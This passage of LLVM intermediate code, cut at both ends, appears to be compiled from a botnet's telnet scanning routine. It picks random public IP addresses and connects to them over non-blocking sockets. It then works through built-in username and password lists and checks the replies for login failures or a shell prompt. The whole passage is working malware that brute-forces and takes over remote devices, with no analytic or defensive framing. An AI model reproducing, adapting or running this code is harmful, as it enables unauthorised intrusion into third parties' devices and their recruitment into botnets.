
.preheader.loopexit:                              ; preds = %.lr.ph309
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit, %0
  %22 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 2, i32 0
  %23 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %1, i64 0, i32 0, i64 0
  br label %.loopexit

.lr.ph309:                                        ; preds = %.lr.ph309.preheader, %.lr.ph309
  %indvars.iv = phi i64 [ %indvars.iv.next, %.lr.ph309 ], [ 0, %.lr.ph309.preheader ]
  %24 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %indvars.iv, i32 3
  store i8 1, i8* %24, align 1
  %25 = tail call noalias i8* @malloc(i64 1024) #3
  %26 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %indvars.iv, i32 8
  store i8* %25, i8** %26, align 8
  tail call void @llvm.memset.p0i8.i64(i8* %25, i8 0, i64 1024, i32 1, i1 false)
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %27 = icmp slt i64 %indvars.iv.next, %19
  br i1 %27, label %.lr.ph309, label %.preheader.loopexit

.loopexit:                                        ; preds = %.loopexit, %.preheader
  br i1 %21, label %.lr.ph.preheader, label %.loopexit

.lr.ph.preheader:                                 ; preds = %.loopexit
  %28 = bitcast %struct.sockaddr_in* %5 to %struct.sockaddr*
  %29 = bitcast i32* %4 to i8*
  br label %.lr.ph

.lr.ph:                                           ; preds = %582, %.lr.ph.preheader
  %.1307 = phi i32 [ %.mux, %582 ], [ 0, %.lr.ph.preheader ]
  %30 = sext i32 %.1307 to i64
  %31 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %30
  %32 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %30, i32 2
  %33 = load i8, i8* %32, align 8
  switch i8 %33, label %582 [
    i8 0, label %34
    i8 1, label %80
    i8 2, label %128
    i8 3, label %196
    i8 4, label %219
    i8 5, label %318
    i8 6, label %341
    i8 7, label %546
    i8 8, label %556
  ]

; <label>:34:                                     ; preds = %.lr.ph
  %35 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %30, i32 8
  %36 = load i8*, i8** %35, align 8
  call void @llvm.memset.p0i8.i64(i8* %36, i8 0, i64 1024, i32 1, i1 false)
  %37 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %30, i32 3
  %38 = load i8, i8* %37, align 1
  %39 = icmp eq i8 %38, 0
  br i1 %39, label %46, label %40

; <label>:40:                                     ; preds = %34
  %41 = bitcast i8** %35 to i64*
  %42 = load i64, i64* %41, align 8
  %43 = bitcast %struct.telstate_t* %31 to i8*
  call void @llvm.memset.p0i8.i64(i8* %43, i8 0, i64 32, i32 16, i1 false)
  store i64 %42, i64* %41, align 8
  %44 = call i32 @getRandomPublicIP()
  %45 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %30, i32 1
  store i32 %44, i32* %45, align 4
  br label %59

; <label>:46:                                     ; preds = %34
  %47 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %30, i32 5
  %48 = load i8, i8* %47, align 1
  %49 = add i8 %48, 1
  store i8 %49, i8* %47, align 1
  %50 = icmp eq i8 %49, 18
  br i1 %50, label %51, label %._crit_edge

._crit_edge:                                      ; preds = %46
  %.phi.trans.insert = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %30, i32 4
  %.pre = load i8, i8* %.phi.trans.insert, align 2
  br label %55

; <label>:51:                                     ; preds = %46
  store i8 0, i8* %47, align 1
  %52 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %30, i32 4
  %53 = load i8, i8* %52, align 2
  %54 = add i8 %53, 1
  store i8 %54, i8* %52, align 2
  br label %55

; <label>:55:                                     ; preds = %._crit_edge, %51
  %56 = phi i8 [ %.pre, %._crit_edge ], [ %54, %51 ]
  %57 = icmp eq i8 %56, 10
  br i1 %57, label %58, label %._crit_edge310

._crit_edge310:                                   ; preds = %55
  %.phi.trans.insert311 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %30, i32 1
  %.pre312 = load i32, i32* %.phi.trans.insert311, align 4
  br label %59

; <label>:58:                                     ; preds = %55
  store i8 1, i8* %37, align 1
  br label %582

; <label>:59:                                     ; preds = %._crit_edge310, %40
  %60 = phi i32 [ %.pre312, %._crit_edge310 ], [ %44, %40 ]
  store i16 2, i16* %11, align 4
  store i16 %12, i16* %13, align 2
  store i64 0, i64* %15, align 4
  store i32 %60, i32* %22, align 4
  %61 = call i32 @socket(i32 2, i32 1, i32 0) #3
  %62 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 0, i32 0
  store i32 %61, i32* %62, align 16
  %63 = icmp eq i32 %61, -1
  br i1 %63, label %582, label %64

; <label>:64:                                     ; preds = %59
  %65 = call i32 (i32, i32, ...) @fcntl(i32 %61, i32 3, i8* null) #3
  %66 = or i32 %65, 2048
  %67 = call i32 (i32, i32, ...) @fcntl(i32 %61, i32 4, i32 %66) #3
  %68 = load i32, i32* %62, align 16
  %69 = call i32 @connect(i32 %68, %struct.sockaddr* nonnull %28, i32 16) #3
  %70 = icmp eq i32 %69, -1
  br i1 %70, label %71, label %78

; <label>:71:                                     ; preds = %64
  %72 = tail call i32* @__errno_location() #17
  %73 = load i32, i32* %72, align 4
  %74 = icmp eq i32 %73, 115
  br i1 %74, label %78, label %75

; <label>:75:                                     ; preds = %71
  %76 = load i32, i32* %62, align 16
  %77 = call i32 @sclose(i32 %76)
  store i8 1, i8* %37, align 1
  br label %582

; <label>:78:                                     ; preds = %71, %64
  store i8 1, i8* %32, align 8
  %79 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %30, i32 6
  store i32 0, i32* %79, align 4
  br label %582

; <label>:80:                                     ; preds = %.lr.ph
  %81 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %30, i32 6
  %82 = load i32, i32* %81, align 4
  %83 = icmp eq i32 %82, 0
  br i1 %83, label %84, label %86

; <label>:84:                                     ; preds = %80
  %85 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  store i32 %85, i32* %81, align 4
  br label %86

; <label>:86:                                     ; preds = %80, %84
  %87 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %23) #3, !srcloc !19
  %88 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 0, i32 0
  %89 = load i32, i32* %88, align 16
  %90 = srem i32 %89, 64
  %91 = zext i32 %90 to i64
  %92 = shl i64 1, %91
  %93 = sdiv i32 %89, 64
  %94 = sext i32 %93 to i64
  %95 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %1, i64 0, i32 0, i64 %94
  %96 = load i64, i64* %95, align 8
  %97 = or i64 %92, %96
  store i64 %97, i64* %95, align 8
  store <2 x i64> <i64 0, i64 10000>, <2 x i64>* %2, align 16
  %98 = add nsw i32 %89, 1
  %99 = call i32 @select(i32 %98, %struct.__sigset_t* null, %struct.__sigset_t* nonnull %1, %struct.__sigset_t* null, %struct.timeval* nonnull %tmpcast) #3
  switch i32 %99, label %119 [
    i32 1, label %100
    i32 -1, label %115
  ]

; <label>:100:                                    ; preds = %86
  store i32 4, i32* %3, align 4
  store i32 0, i32* %4, align 4
  %101 = load i32, i32* %88, align 16
  %102 = call i32 @getsockopt(i32 %101, i32 1, i32 4, i8* nonnull %29, i32* nonnull %3) #3
  %103 = load i32, i32* %4, align 4
  %104 = icmp eq i32 %103, 0
  %105 = load i32, i32* %88, align 16
  br i1 %104, label %108, label %106

; <label>:106:                                    ; preds = %100
  %107 = call i32 @sclose(i32 %105)
  br label %.sink.split

; <label>:108:                                    ; preds = %100
  %109 = call i32 (i32, i32, ...) @fcntl(i32 %105, i32 3, i8* null) #3
  %110 = and i32 %109, -2049
  %111 = call i32 (i32, i32, ...) @fcntl(i32 %105, i32 4, i32 %110) #3
  store i32 0, i32* %81, align 4
  %112 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %30, i32 7
  store i16 0, i16* %112, align 16
  %113 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %30, i32 8
  %114 = load i8*, i8** %113, align 8
  call void @llvm.memset.p0i8.i64(i8* %114, i8 0, i64 1024, i32 1, i1 false)
  store i8 2, i8* %32, align 8
  br label %582

; <label>:115:                                    ; preds = %86
  %116 = load i32, i32* %88, align 16
  %117 = call i32 @sclose(i32 %116)
  br label %.sink.split

.sink.split:                                      ; preds = %106, %115
  store i8 0, i8* %32, align 8
  %118 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %30, i32 3
  store i8 1, i8* %118, align 1
  br label %119

; <label>:119:                                    ; preds = %86, %.sink.split
  %120 = load i32, i32* %81, align 4
  %121 = add i32 %120, 10
  %122 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %123 = icmp ult i32 %121, %122
  br i1 %123, label %124, label %582

; <label>:124:                                    ; preds = %119
  %125 = load i32, i32* %88, align 16
  %126 = call i32 @sclose(i32 %125)
  store i8 0, i8* %32, align 8
  %127 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %30, i32 3
  store i8 1, i8* %127, align 1
  br label %582

; <label>:128:                                    ; preds = %.lr.ph
  %129 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %30, i32 6
  %130 = load i32, i32* %129, align 4
  %131 = icmp eq i32 %130, 0
  br i1 %131, label %132, label %134

; <label>:132:                                    ; preds = %128
  %133 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  store i32 %133, i32* %129, align 4
  br label %134

; <label>:134:                                    ; preds = %132, %128
  %135 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 0, i32 0
  %136 = load i32, i32* %135, align 16
  %137 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %30, i32 8
  %138 = load i8*, i8** %137, align 8
  %139 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %30, i32 7
  %140 = load i16, i16* %139, align 16
  %141 = zext i16 %140 to i32
  %142 = call i32 @readUntil(i32 %136, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.25, i64 0, i64 0), i32 0, i32 0, i32 10000, i8* %138, i32 1024, i32 %141)
  %143 = icmp eq i32 %142, 0
  br i1 %143, label %148, label %144

; <label>:144:                                    ; preds = %134
  store i32 0, i32* %129, align 4
  store i16 0, i16* %139, align 16
  %145 = load i8*, i8** %137, align 8
  %146 = call i8* @strstr(i8* %145, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.26, i64 0, i64 0)) #14
  %147 = icmp ne i8* %146, null
  %.sink = select i1 %147, i8 5, i8 3
  store i8 %.sink, i8* %32, align 8
  call void @llvm.memset.p0i8.i64(i8* %145, i8 0, i64 1024, i32 1, i1 false)
  br label %582

; <label>:148:                                    ; preds = %134
  %149 = load i32, i32* %135, align 16
  %150 = load i8*, i8** %137, align 8
  %151 = load i16, i16* %139, align 16
  %152 = zext i16 %151 to i32
  %153 = call i32 @readUntil(i32 %149, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.27, i64 0, i64 0), i32 0, i32 0, i32 10000, i8* %150, i32 1024, i32 %152)
  %154 = icmp eq i32 %153, 0
  br i1 %154, label %157, label %155

; <label>:155:                                    ; preds = %148
  store i32 0, i32* %129, align 4
  store i16 0, i16* %139, align 16
  %156 = load i8*, i8** %137, align 8
  call void @llvm.memset.p0i8.i64(i8* %156, i8 0, i64 1024, i32 1, i1 false)
  store i8 3, i8* %32, align 8
  br label %582

; <label>:157:                                    ; preds = %148
  %158 = load i32, i32* %135, align 16
  %159 = load i8*, i8** %137, align 8
  %160 = load i16, i16* %139, align 16
  %161 = zext i16 %160 to i32
  %162 = call i32 @readUntil(i32 %158, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.28, i64 0, i64 0), i32 0, i32 0, i32 10000, i8* %159, i32 1024, i32 %161)
  %163 = icmp eq i32 %162, 0
  br i1 %163, label %166, label %164

; <label>:164:                                    ; preds = %157
  store i32 0, i32* %129, align 4
  store i16 0, i16* %139, align 16
  %165 = load i8*, i8** %137, align 8
  call void @llvm.memset.p0i8.i64(i8* %165, i8 0, i64 1024, i32 1, i1 false)
  store i8 5, i8* %32, align 8
  br label %582

; <label>:166:                                    ; preds = %157
  %167 = load i32, i32* %135, align 16
  %168 = load i8*, i8** %137, align 8
  %169 = load i16, i16* %139, align 16
  %170 = zext i16 %169 to i32
  %171 = call i32 @readUntil(i32 %167, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.29, i64 0, i64 0), i32 0, i32 0, i32 10000, i8* %168, i32 1024, i32 %170)
  %172 = icmp eq i32 %171, 0
  br i1 %172, label %175, label %173

; <label>:173:                                    ; preds = %166
  store i32 0, i32* %129, align 4
  store i16 0, i16* %139, align 16
  %174 = load i8*, i8** %137, align 8
  call void @llvm.memset.p0i8.i64(i8* %174, i8 0, i64 1024, i32 1, i1 false)
  store i8 3, i8* %32, align 8
  br label %582

; <label>:175:                                    ; preds = %166
  %176 = load i32, i32* %135, align 16
  %177 = load i8*, i8** %137, align 8
  %178 = load i16, i16* %139, align 16
  %179 = zext i16 %178 to i32
  %180 = call i32 @readUntil(i32 %176, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.30, i64 0, i64 0), i32 0, i32 0, i32 10000, i8* %177, i32 1024, i32 %179)
  %181 = icmp eq i32 %180, 0
  br i1 %181, label %184, label %182

; <label>:182:                                    ; preds = %175
  store i32 0, i32* %129, align 4
  store i16 0, i16* %139, align 16
  %183 = load i8*, i8** %137, align 8
  call void @llvm.memset.p0i8.i64(i8* %183, i8 0, i64 1024, i32 1, i1 false)
  store i8 5, i8* %32, align 8
  br label %582

; <label>:184:                                    ; preds = %175
  %185 = load i8*, i8** %137, align 8
  %186 = call i64 @strlen(i8* %185) #14
  %187 = trunc i64 %186 to i16
  store i16 %187, i16* %139, align 16
  %188 = load i32, i32* %129, align 4
  %189 = add i32 %188, 10
  %190 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %191 = icmp ult i32 %189, %190
  br i1 %191, label %192, label %582

; <label>:192:                                    ; preds = %184
  %193 = load i32, i32* %135, align 16
  %194 = call i32 @sclose(i32 %193)
  store i8 0, i8* %32, align 8
  %195 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %30, i32 3
  store i8 1, i8* %195, align 1
  br label %582

; <label>:196:                                    ; preds = %.lr.ph
  %197 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 0, i32 0
  %198 = load i32, i32* %197, align 16
  %199 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %30, i32 4
  %200 = load i8, i8* %199, align 2
  %201 = zext i8 %200 to i64
  %202 = getelementptr inbounds [10 x i8*], [10 x i8*]* @usernames, i64 0, i64 %201
  %203 = load i8*, i8** %202, align 8
  %204 = call i64 @strlen(i8* %203) #14
  %205 = call i64 @send(i32 %198, i8* %203, i64 %204, i32 16384) #3
  %206 = icmp slt i64 %205, 0
  %207 = load i32, i32* %197, align 16
  br i1 %206, label %208, label %211

; <label>:208:                                    ; preds = %196
  %209 = call i32 @sclose(i32 %207)
  store i8 0, i8* %32, align 8
  %210 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %30, i32 3
  store i8 1, i8* %210, align 1
  br label %582

; <label>:211:                                    ; preds = %196
  %212 = call i64 @send(i32 %207, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.31, i64 0, i64 0), i64 2, i32 16384) #3
  %213 = icmp slt i64 %212, 0
  br i1 %213, label %214, label %218

; <label>:214:                                    ; preds = %211
  %215 = load i32, i32* %197, align 16
  %216 = call i32 @sclose(i32 %215)
  store i8 0, i8* %32, align 8
  %217 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %30, i32 3
  store i8 1, i8* %217, align 1
  br label %582

; <label>:218:                                    ; preds = %211
  store i8 4, i8* %32, align 8
  br label %582

; <label>:219:                                    ; preds = %.lr.ph
  %220 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %30, i32 6
  %221 = load i32, i32* %220, align 4
  %222 = icmp eq i32 %221, 0
  br i1 %222, label %223, label %225

; <label>:223:                                    ; preds = %219
  %224 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  store i32 %224, i32* %220, align 4
  br label %225

; <label>:225:                                    ; preds = %223, %219
  %226 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 0, i32 0
  %227 = load i32, i32* %226, align 16
  %228 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %30, i32 8
  %229 = load i8*, i8** %228, align 8
  %230 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %30, i32 7
  %231 = load i16, i16* %230, align 16
  %232 = zext i16 %231 to i32
  %233 = call i32 @readUntil(i32 %227, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.28, i64 0, i64 0), i32 1, i32 0, i32 10000, i8* %229, i32 1024, i32 %232)
  %234 = icmp eq i32 %233, 0
  br i1 %234, label %239, label %235

; <label>:235:                                    ; preds = %225
  store i32 0, i32* %220, align 4
  store i16 0, i16* %230, align 16
  %236 = load i8*, i8** %228, align 8
  %237 = call i8* @strstr(i8* %236, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.28, i64 0, i64 0)) #14
  %238 = icmp ne i8* %237, null
  %.sink3 = select i1 %238, i8 5, i8 7
  store i8 %.sink3, i8* %32, align 8
  call void @llvm.memset.p0i8.i64(i8* %236, i8 0, i64 1024, i32 1, i1 false)
  br label %582

; <label>:239:                                    ; preds = %225
  %240 = load i32, i32* %226, align 16
  %241 = load i8*, i8** %228, align 8
  %242 = load i16, i16* %230, align 16
  %243 = zext i16 %242 to i32
  %244 = call i32 @readUntil(i32 %240, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.30, i64 0, i64 0), i32 1, i32 0, i32 10000, i8* %241, i32 1024, i32 %243)
  %245 = icmp eq i32 %244, 0
  br i1 %245, label %250, label %246

; <label>:246:                                    ; preds = %239
  store i32 0, i32* %220, align 4
  store i16 0, i16* %230, align 16
  %247 = load i8*, i8** %228, align 8
  %248 = call i8* @strstr(i8* %247, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.30, i64 0, i64 0)) #14
  %249 = icmp ne i8* %248, null
  %.sink4 = select i1 %249, i8 5, i8 7
  store i8 %.sink4, i8* %32, align 8
  call void @llvm.memset.p0i8.i64(i8* %247, i8 0, i64 1024, i32 1, i1 false)
  br label %582

; <label>:250:                                    ; preds = %239
  %251 = load i8*, i8** %228, align 8
  %252 = call i8* @strstr(i8* %251, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.32, i64 0, i64 0)) #14
  %253 = icmp eq i8* %252, null
  br i1 %253, label %258, label %254

; <label>:254:                                    ; preds = %250
  %255 = load i32, i32* %226, align 16
  %256 = call i32 @sclose(i32 %255)
  store i8 0, i8* %32, align 8
  %257 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %30, i32 3
  store i8 0, i8* %257, align 1
  br label %582

; <label>:258:                                    ; preds = %250
  %259 = call i8* @strstr(i8* %251, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.33, i64 0, i64 0)) #14
  %260 = icmp eq i8* %259, null
  br i1 %260, label %265, label %261

; <label>:261:                                    ; preds = %258
  %262 = load i32, i32* %226, align 16
  %263 = call i32 @sclose(i32 %262)
  store i8 0, i8* %32, align 8
  %264 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %30, i32 3
  store i8 0, i8* %264, align 1
  br label %582

; <label>:265:                                    ; preds = %258
  %266 = call i8* @strstr(i8* %251, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.34, i64 0, i64 0)) #14
  %267 = icmp eq i8* %266, null
  br i1 %267, label %272, label %268

; <label>:268:                                    ; preds = %265
  %269 = load i32, i32* %226, align 16
  %270 = call i32 @sclose(i32 %269)
  store i8 0, i8* %32, align 8
  %271 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %30, i32 3
  store i8 0, i8* %271, align 1
  br label %582

; <label>:272:                                    ; preds = %265
  %273 = call i8* @strstr(i8* %251, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.35, i64 0, i64 0)) #14
  %274 = icmp eq i8* %273, null
  br i1 %274, label %279, label %275

; <label>:275:                                    ; preds = %272
  %276 = load i32, i32* %226, align 16
  %277 = call i32 @sclose(i32 %276)
  store i8 0, i8* %32, align 8
  %278 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %30, i32 3
  store i8 0, i8* %278, align 1
  br label %582

; <label>:279:                                    ; preds = %272
  %280 = call i8* @strstr(i8* %251, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.36, i64 0, i64 0)) #14
  %281 = icmp eq i8* %280, null
  br i1 %281, label %286, label %282

; <label>:282:                                    ; preds = %279
  %283 = load i32, i32* %226, align 16
  %284 = call i32 @sclose(i32 %283)
  store i8 0, i8* %32, align 8
  %285 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %30, i32 3
  store i8 0, i8* %285, align 1
  br label %582

; <label>:286:                                    ; preds = %279
  %287 = call i8* @strstr(i8* %251, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.37, i64 0, i64 0)) #14
  %288 = icmp eq i8* %287, null
  br i1 %288, label %293, label %289

; <label>:289:                                    ; preds = %286
  %290 = load i32, i32* %226, align 16
  %291 = call i32 @sclose(i32 %290)
  store i8 0, i8* %32, align 8
  %292 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %30, i32 3
  store i8 0, i8* %292, align 1
  br label %582

; <label>:293:                                    ; preds = %286
  %294 = call i8* @strstr(i8* %251, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.38, i64 0, i64 0)) #14
  %295 = icmp eq i8* %294, null
  br i1 %295, label %300, label %296

; <label>:296:                                    ; preds = %293
  %297 = load i32, i32* %226, align 16
  %298 = call i32 @sclose(i32 %297)
  store i8 0, i8* %32, align 8
  %299 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %30, i32 3
  store i8 0, i8* %299, align 1
  br label %582

; <label>:300:                                    ; preds = %293
  %301 = call i8* @strstr(i8* %251, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.39, i64 0, i64 0)) #14
  %302 = icmp eq i8* %301, null
  br i1 %302, label %307, label %303

; <label>:303:                                    ; preds = %300
  %304 = load i32, i32* %226, align 16
  %305 = call i32 @sclose(i32 %304)
  store i8 0, i8* %32, align 8
  %306 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %30, i32 3
  store i8 0, i8* %306, align 1
  br label %582

; <label>:307:                                    ; preds = %300
  %308 = call i64 @strlen(i8* %251) #14
  %309 = trunc i64 %308 to i16
  store i16 %309, i16* %230, align 16
  %310 = load i32, i32* %220, align 4
  %311 = add i32 %310, 10
  %312 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %313 = icmp ult i32 %311, %312
  br i1 %313, label %314, label %582

; <label>:314:                                    ; preds = %307
  %315 = load i32, i32* %226, align 16
  %316 = call i32 @sclose(i32 %315)
  store i8 0, i8* %32, align 8
  %317 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %30, i32 3
  store i8 1, i8* %317, align 1
  br label %582

; <label>:318:                                    ; preds = %.lr.ph
  %319 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 0, i32 0
  %320 = load i32, i32* %319, align 16
  %321 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %30, i32 5
  %322 = load i8, i8* %321, align 1
  %323 = zext i8 %322 to i64
  %324 = getelementptr inbounds [18 x i8*], [18 x i8*]* @passwords, i64 0, i64 %323
  %325 = load i8*, i8** %324, align 8
  %326 = call i64 @strlen(i8* %325) #14
  %327 = call i64 @send(i32 %320, i8* %325, i64 %326, i32 16384) #3
  %328 = icmp slt i64 %327, 0
  %329 = load i32, i32* %319, align 16
  br i1 %328, label %330, label %333

; <label>:330:                                    ; preds = %318
  %331 = call i32 @sclose(i32 %329)
  store i8 0, i8* %32, align 8
  %332 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %30, i32 3
  store i8 1, i8* %332, align 1
  br label %582

; <label>:333:                                    ; preds = %318
  %334 = call i64 @send(i32 %329, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.31, i64 0, i64 0), i64 2, i32 16384) #3
  %335 = icmp slt i64 %334, 0
  br i1 %335, label %336, label %340

; <label>:336:                                    ; preds = %333
  %337 = load i32, i32* %319, align 16
  %338 = call i32 @sclose(i32 %337)
  store i8 0, i8* %32, align 8
  %339 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %30, i32 3
  store i8 1, i8* %339, align 1
  br label %582

; <label>:340:                                    ; preds = %333
  store i8 6, i8* %32, align 8
  br label %582

; <label>:341:                                    ; preds = %.lr.ph
  %342 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %30, i32 6
  %343 = load i32, i32* %342, align 4
  %344 = icmp eq i32 %343, 0
  br i1 %344, label %345, label %347

; <label>:345:                                    ; preds = %341
  %346 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  store i32 %346, i32* %342, align 4
  br label %347

; <label>:347:                                    ; preds = %345, %341
  %348 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 0, i32 0
  %349 = load i32, i32* %348, align 16
  %350 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %30, i32 8
  %351 = load i8*, i8** %350, align 8
  %352 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %30, i32 7
  %353 = load i16, i16* %352, align 16
  %354 = zext i16 %353 to i32
  %355 = call i32 @readUntil(i32 %349, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.32, i64 0, i64 0), i32 1, i32 0, i32 10000, i8* %351, i32 1024, i32 %354)
  %356 = icmp eq i32 %355, 0
  br i1 %356, label %373, label %357

; <label>:357:                                    ; preds = %347
  store i32 0, i32* %342, align 4
  store i16 0, i16* %352, align 16
  %358 = load i8*, i8** %350, align 8
  %359 = call i8* @strstr(i8* %358, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.32, i64 0, i64 0)) #14
  %360 = icmp eq i8* %359, null
  br i1 %360, label %365, label %361

; <label>:361:                                    ; preds = %357
  call void @llvm.memset.p0i8.i64(i8* %358, i8 0, i64 1024, i32 1, i1 false)
  %362 = load i32, i32* %348, align 16
  %363 = call i32 @sclose(i32 %362)
  store i8 0, i8* %32, align 8
  %364 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %30, i32 3
  store i8 0, i8* %364, align 1
  br label %582

; <label>:365:                                    ; preds = %357
  %366 = call i32 @matchPrompt(i8* %358)
  %367 = icmp eq i32 %366, 0
  br i1 %367, label %368, label %372

; <label>:368:                                    ; preds = %365
  call void @llvm.memset.p0i8.i64(i8* %358, i8 0, i64 1024, i32 1, i1 false)
  %369 = load i32, i32* %348, align 16
  %370 = call i32 @sclose(i32 %369)
  store i8 0, i8* %32, align 8
  %371 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %30, i32 3
  store i8 1, i8* %371, align 1
  br label %582

; <label>:372:                                    ; preds = %365
  store i8 7, i8* %32, align 8
  call void @llvm.memset.p0i8.i64(i8* %358, i8 0, i64 1024, i32 1, i1 false)
  br label %582

; <label>:373:                                    ; preds = %347
  %374 = load i32, i32* %348, align 16
  %375 = load i8*, i8** %350, align 8
  %376 = load i16, i16* %352, align 16
  %377 = zext i16 %376 to i32
  %378 = call i32 @readUntil(i32 %374, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.33, i64 0, i64 0), i32 1, i32 0, i32 10000, i8* %375, i32 1024, i32 %377)
  %379 = icmp eq i32 %378, 0
  br i1 %379, label %396, label %380

; <label>:380:                                    ; preds = %373
  store i32 0, i32* %342, align 4
  store i16 0, i16* %352, align 16
  %381 = load i8*, i8** %350, align 8
  %382 = call i8* @strstr(i8* %381, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.33, i64 0, i64 0)) #14
  %383 = icmp eq i8* %382, null
  br i1 %383, label %388, label %384

; <label>:384:                                    ; preds = %380
  call void @llvm.memset.p0i8.i64(i8* %381, i8 0, i64 1024, i32 1, i1 false)
  %385 = load i32, i32* %348, align 16
  %386 = call i32 @sclose(i32 %385)
  store i8 0, i8* %32, align 8
  %387 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %30, i32 3
  store i8 0, i8* %387, align 1
  br label %582

; <label>:388:                                    ; preds = %380
  %389 = call i32 @matchPrompt(i8* %381)
  %390 = icmp eq i32 %389, 0
  br i1 %390, label %391, label %395

; <label>:391:                                    ; preds = %388
  call void @llvm.memset.p0i8.i64(i8* %381, i8 0, i64 1024, i32 1, i1 false)
